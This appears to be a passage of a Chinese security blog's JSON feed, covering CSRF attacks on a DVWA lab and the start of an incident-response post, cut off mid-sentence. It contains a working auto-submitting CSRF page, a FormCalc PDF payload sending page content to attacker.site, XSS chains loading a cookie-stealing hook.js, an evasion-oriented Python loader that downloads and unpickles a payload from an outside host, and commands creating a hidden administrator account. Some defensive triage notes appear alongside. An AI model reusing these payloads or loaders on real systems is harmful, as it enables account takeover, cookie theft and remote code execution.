class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">&quot;javascript:fireForms()&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">&quot;JavaScript&quot;</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"keyword\">var</span> pauses = <span class=\"keyword\">new</span> <span class=\"title class_\">Array</span>( <span class=\"string\">&quot;53&quot;</span> );</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"keyword\">function</span> <span class=\"title function_\">pausecomp</span>(<span class=\"params\">millis</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> date = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> curDate = <span class=\"literal\">null</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">do</span> &#123; curDate = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>(); &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">while</span>(curDate-date &lt; millis);</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"keyword\">function</span> <span class=\"title function_\">fireForms</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> count = <span class=\"number\">1</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> i=<span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>; i&lt;count; i++)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">document</span>.<span class=\"property\">forms</span>[i].<span class=\"title function_\">submit</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">        </span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"title function_\">pausecomp</span>(pauses[i]);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">H2</span>&gt;</span>OWASP CRSFTester Demonstration<span class=\"tag\">&lt;/<span class=\"name\">H2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;GET&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;form0&quot;</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://10.128.50.84:18888/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;value&quot;</span>/&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>将它放在我的服务器上： <code>(http://101.35.139.208:9999/shabi233.html)</code></p>\n<p>再以同样的方式生成短链接： <code>http://gg.gg/12ivbn</code></p>\n<p>访问后密码就会被修改</p>\n<h2 id=\"csrf-防御\"><a class=\"markdownIt-Anchor\" href=\"#csrf-防御\">#</a> CSRF 防御</h2>\n<p>1. 在请求地址中添加 token 验证</p>\n<input type=\"hidden\" name=\"token\" value=\"\">\n<p>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，可以在用户登录后放入 session 中，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>\n<p>2. 添加 referer 认证</p>\n<p>如果是以网站 WebA 的网址开头的域名，则说明该请求是来自 WebA 自己的请求，是合法的。</p>\n<p>但 referer 可以伪造</p>\n<p>3. 限制跨域</p>\n<p>阻止不明外域的访问，使用 json api</p>\n<p>使用 JavaScript 发起 AJAX 请求是限制跨域的，并不能通过简单的表单来发送 JSON，所以，通过只接收 JSON 可以很大可能避免 CSRF 攻击。</p>\n<ul>\n<li>同源检测</li>\n<li>Samesite Cookie</li>\n</ul>\n<p>4. 修改密码时需要原密码</p>\n<h2 id=\"csrf绕过\"><a class=\"markdownIt-Anchor\" href=\"#csrf绕过\">#</a> CSRF 绕过</h2>\n<p>1.referer 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.置空：删除referer内容</span><br><span class=\"line\">2.子域名：因为开发的正则问题可能存在子域名这种绕过方式，比如 https://baidu.weiyigeek.com 我们让baidu变成子域名这样就绕过了比较弱的正则了</span><br><span class=\"line\">3.修改域名：https://adafsec.weiyigeek.org https://0dafsec.weiyigeek.org https://Ddafsec.weiyigeek.org利用这种方法也是绕过referer验证的好方法</span><br><span class=\"line\">4.参数： https://weiyigeek.org/?https://dafsec.org</span><br></pre></td></tr></table></figure>\n<p>2. 删除 X-CSRFToken 报头然后将 POST 请求改为 GET</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用POST和删除“X-CSRFToken”报头测试成功-构造PoC以GET请求来修改邮箱-成功CSRF攻击后利用修改后邮箱重置密码</span><br></pre></td></tr></table></figure>\n<p>3.Use Bad PDF</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FormCalc的get()和post()方法允许过滤CSRF-token,其实就是我们的PDF被浏览器解析，因为插件的原因可以进行请求，我们上传恶意的PDF文件在目标网站这样可以绕过referer甚至CSRF token </span><br><span class=\"line\">&lt;script contentType=&#x27;application/x-formcalc&#x27;&gt;</span><br><span class=\"line\">  var content = GET(&quot;https://example.com/Settings.action&quot;); </span><br><span class=\"line\">  Post(&quot;http://attacker.site/loot&quot;,content,&quot;text/plain&quot;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>旁路 cookie 注入绕过</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">描述:攻击者可以通过cookie注入绕过双重提交cookie保护 cookie注入的方法:</span><br><span class=\"line\"></span><br><span class=\"line\">- CRLF-injection (HTML响应拆分注入漏洞)</span><br><span class=\"line\">- Browser bugs (like CVE-2016-9078 in Firefox)</span><br></pre></td></tr></table></figure>\n<p>5.Content-Type 绕过方法</p>\n<p>描述：该类漏洞主要是利用的程序后端没有验证 (Calidate) <code>Content-Type</code>  头；攻击者只能通过 HTML 表单或 XHR api 发送 “简单” 的内容类型:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* text/plain</span><br><span class=\"line\">* application/x-www-form-urlencoded</span><br><span class=\"line\">* multipart/form-dat</span><br></pre></td></tr></table></figure>\n<h2 id=\"xss-csrf\"><a class=\"markdownIt-Anchor\" href=\"#xss-csrf\">#</a> xss + csrf</h2>\n<p>selfxss 就是只能对本地客户端产生影响的跨站脚本攻击，举例简单来说就是像获取到的 cookie 是自己的，显然这并没有什么实际危害，但是一旦结合跨站请求伪造则会导致危害升级，并且成为存储型的跨站脚本攻击。</p>\n<h4 id=\"stored-xss-csrf\"><a class=\"markdownIt-Anchor\" href=\"#stored-xss-csrf\">#</a> stored xss + csrf</h4>\n<p>即同时存在 xss 和 csrf 的地方</p>\n<p>思路是：在 xss 中插入我们构造的 csrf 的恶意代码的连接，一旦用户访问，我们就可以跳转到 csrf 页面干一些见不得人的事</p>\n<p>1. 使用前面提到过的 csrftester 生成一个 payload，放在自己的服务器上，比如我的服务器为 1.1.1.1，生成的 payload 名字是 haha.html，放在网站根目录下，那么此时完整路径为 <code>1.1.1.1/haha.html</code></p>\n<p>2. 在 stroed xss 处插入： <code>&lt;script src=&quot;x&quot; onerror=javascript:window.open(&quot;http://1.1.1.1/haha.html&quot;)&gt;&lt;/script&gt;</code></p>\n<p>3. 用户一旦访问，我们 haha.html 中的 csrf 恶意代码就会被执行</p>\n<h4 id=\"self-xss-csrf\"><a class=\"markdownIt-Anchor\" href=\"#self-xss-csrf\">#</a> self-xss + csrf</h4>\n<p>selfxss 一般只能获取自己的 cookie，但结合 csrf，我们可以获取别人的 cookie。我们在 input 中提交的是 hook.js，用户一旦点击，相当于让别人触发这个 js，cookie 被外带到平台，而 selfxss 则是自己触发 js</p>\n<p>1. 首先准备一个 xss 平台，使用它他提供的 payload： <code>&lt;script src=&quot;http://192.168.38.129:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>\n<p>2. 使用 csrftester 生成我们的 payload，payload 路径和名称参考前一个 <code>1.1.1.1/haha.html</code> ，但此时 payload 需要做一些修改</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form method=&quot;GET&quot; name=&quot;form0&quot; action=&quot;http://192.168.38.132:80/dvwa/vulnerabilities/xss_r/?name=&lt;script src=&#x27;http://192.168.38.129:3000/hook.js&#x27;&gt;&lt;/script&gt;&quot;&gt;</span><br><span class=\"line\">&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;&lt;script src=&#x27;http://192.168.38.129:3000/hook.js&#x27;&gt;&lt;/script&gt;&quot;/&gt; </span><br></pre></td></tr></table></figure>\n<p>3. 用户登录账户，点击我们的链接，我们就能在 xss 平台看到他的 cookie 了</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZWNoLm1laXR1YW4uY29tLzIwMTgvMTAvMTEvZmUtc2VjdXJpdHktY3NyZi5odG1s\">前端安全系列（二）：如何防止 CSRF 攻击？ - 美团技术团队 (meituan.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2NDA2OS5odG1s\">鸡肋 CSRF 和 Self-XSS 组合的变废为宝 - FreeBuf 网络安全行业门户</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzM0MTU5MS5odG1s\">CSRF 入门及靶场实战 - FreeBuf 网络安全行业门户</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/05/27/emergency%20response/",
            "url": "http://example.com/2022/05/27/emergency%20response/",
            "title": "应急响应",
            "date_published": "2022-05-27T05:38:45.000Z",
            "content_html": "<h1 id=\"emergency-response\"><a class=\"markdownIt-Anchor\" href=\"#emergency-response\">#</a> emergency response</h1>\n<h2 id=\"入侵排查\"><a class=\"markdownIt-Anchor\" href=\"#入侵排查\">#</a> 入侵排查</h2>\n<h3 id=\"windows\"><a class=\"markdownIt-Anchor\" href=\"#windows\">#</a> Windows</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.生成msf木马</span><br><span class=\"line\">msfvenom -p LHOST LPORT -f</span><br><span class=\"line\"></span><br><span class=\"line\">2.监听</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload </span><br><span class=\"line\">set lohost</span><br><span class=\"line\">set lport</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>msf 中可以在网络链接中找到，但任务管理器找不到</p>\n</blockquote>\n<h4 id=\"端口\"><a class=\"markdownIt-Anchor\" href=\"#端口\">#</a> 端口</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310&gt;netstat -ano | findstr &quot;ESTABLISH&quot;</span><br><span class=\"line\">  TCP    10.128.50.84:49893     42.81.179.166:80       ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:49898     42.81.193.250:443      ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:49919     103.212.12.39:3000     ESTABLISHED     2208</span><br><span class=\"line\">  TCP    10.128.50.84:57229     119.3.227.186:11113    ESTABLISHED     35024</span><br><span class=\"line\">  TCP    10.128.50.84:57357     113.142.50.195:443     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:57413     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:57462     117.62.242.202:80      ESTABLISHED     25756</span><br><span class=\"line\">  TCP    10.128.50.84:57464     120.133.59.142:443     ESTABLISHED     6056</span><br><span class=\"line\">  TCP    10.128.50.84:57474     120.133.59.142:443     ESTABLISHED     6484</span><br><span class=\"line\">  TCP    10.128.50.84:57483     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:59370     101.89.15.105:443      ESTABLISHED     33384</span><br><span class=\"line\">  TCP    10.128.50.84:59493     20.198.162.76:443      ESTABLISHED     11804</span><br><span class=\"line\">  TCP    10.128.50.84:59899     150.158.219.208:443    ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:63118     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:63177     20.197.71.89:443       ESTABLISHED     11804</span><br></pre></td></tr></table></figure>\n<h4 id=\"进程\"><a class=\"markdownIt-Anchor\" href=\"#进程\">#</a> 进程</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310&gt;tasklist /svc | findstr 2208</span><br><span class=\"line\">LenovoInternetSoftwareFra     2208 暂缺</span><br></pre></td></tr></table></figure>\n<p>软件查杀</p>\n<blockquote>\n<p>PCHunter</p>\n<p>分析进程，分析签名，corporation 等</p>\n<p>火绒剑<br>\n process，autorun</p>\n<p>Process Monitor</p>\n</blockquote>\n<p>删除进程</p>\n<blockquote>\n<p>taskkill /F /T /PID 2208</p>\n<p>参数列表:</p>\n<pre><code>/S    system           指定要连接的远程系统。\n\n/U    [domain\\]user    指定应该在哪个用户上下文执行这个命令。\n\n/P    [password]       为提供的用户上下文指定密码。如果忽略，提示\n                       输入。\n\n/FI   filter           应用筛选器以选择一组任务。\n                       允许使用 &quot;*&quot;。例如，映像名称 eq acme*\n\n/PID  processid        指定要终止的进程的 PID。\n                       使用 TaskList 取得 PID。\n\n/IM   imagename        指定要终止的进程的映像名称。通配符 '*'可用来\n                       指定所有任务或映像名称。\n\n/T                     终止指定的进程和由它启用的子进程。\n\n/F                     指定强制终止进程。\n\n/?                     显示帮助消息。\n</code></pre>\n</blockquote>\n<p>找一些小众的 C2 框架，提升过免杀的概率</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTk3NzY3\">https://cloud.tencent.com/developer/article/1597767</span></p>\n<p>CS 上线</p>\n<blockquote>\n<p>netstat 中开始没有 cs 的连接，只有当 cs 中发出命令时才会建立连接，并且服务器发完命令立刻中断连接</p>\n<p>建立连接时间为 sleep</p>\n<p>因为受害者和攻击者通过中间的 teamserver 建立连接</p>\n</blockquote>\n<p>找进程</p>\n<blockquote>\n<p>tasklist  前提是没有注入进程</p>\n<p>注入进程后使用工具</p>\n</blockquote>\n<p>免杀通过 rc4 加密，比 aes 更好</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">import pickle as json</span><br><span class=\"line\">import ctypes</span><br><span class=\"line\">import urllib.request</span><br><span class=\"line\">import codecs</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\"># pick = &quot;&quot;&quot;</span><br><span class=\"line\"># json.loads(base64.b64decode(AES.new(b&#x27;ysIx0oKueJV15dkA4P3WvDjnq9giB62=&#x27;, AES.MODE_CBC, b&#x27;jbMNXRf954m0WUzQ&#x27;).decrypt(base64.b64decode((b&#x27;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&#x27;</span><br><span class=\"line\"># )))))</span><br><span class=\"line\"># &quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># res = base64.b64decode(AES.new(b&#x27;ysIx0oKueJV15dkA4P3WvDjnq9giB62=&#x27;, AES.MODE_CBC, b&#x27;jbMNXRf954m0WUzQ&#x27;).decrypt(base64.b64decode((b&#x27;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&#x27;</span><br><span class=\"line\"># ))))</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(res)</span><br><span class=\"line\">#</span><br><span class=\"line\"># class A(object):</span><br><span class=\"line\">#     def __reduce__(self):</span><br><span class=\"line\">#         return (exec, (pick,))</span><br><span class=\"line\"># ret = json.dumps(A())</span><br><span class=\"line\"># print(ret)</span><br><span class=\"line\"># res = base64.b64encode(ret)</span><br><span class=\"line\"># print(res)</span><br><span class=\"line\">html=urllib.request.urlopen(&#x27;http://i.miaosu.bid/data/f_41570228.gif&#x27;).read()[7:]</span><br><span class=\"line\">html = html.strip(b&#x27;\\r\\n&#x27;)</span><br><span class=\"line\">res = html[:-3][::-1]+html[-3:]</span><br><span class=\"line\"># print(base64.b64decode(res))</span><br><span class=\"line\">json.loads(base64.b64decode(res))</span><br></pre></td></tr></table></figure>\n<p>在通过 pyinstaller 无窗口编译成为 exe</p>\n<h4 id=\"账户\"><a class=\"markdownIt-Anchor\" href=\"#账户\">#</a> 账户</h4>\n<blockquote>\n<p>首选管理员账户登录，不建议创建账户</p>\n<p>通过 net use 或者 computer mananger 查看用户</p>\n<p>net user haha$ shabi /add      //$ 结尾的用户为影子用户</p>\n<p>net localgroup adminstrators haha$ /add     // 加到管理员组</p>\n<p>此时 net user 看不到，但 computer manager 能看到</p>\n<p>或者通过注册表注册</p>\n<p>先把影子账户和正常账户导出</p>\n<p>通过修改账户的 F 键为想要克隆的键</p>\n<p>导入注册表</p>\n<p>具体自己查吧…</p>\n<p>控制面板和 net user 看不到，但注册表还是可以看到的</p>\n<p>因此在应急响应时查账户要查三个地方</p>\n<p>注册表，控制面板，net user</p>\n<p>或者使用 D 盾</p>\n<p>或者查看日志 eventvwr.msc</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105174751675.png\" alt=\"image-20221105174751675\" style=\"zoom:80%;\" />\n<p>Windows logs -&gt; security</p>\n<p>4624 4625</p>\n</blockquote>\n<h4 id=\"启动项任务计划服务\"><a class=\"markdownIt-Anchor\" href=\"#启动项任务计划服务\">#</a> 启动项，任务计划，服务</h4>\n<blockquote>\n<p>工具可以排查服务和启动项</p>\n<p>任务计划 task 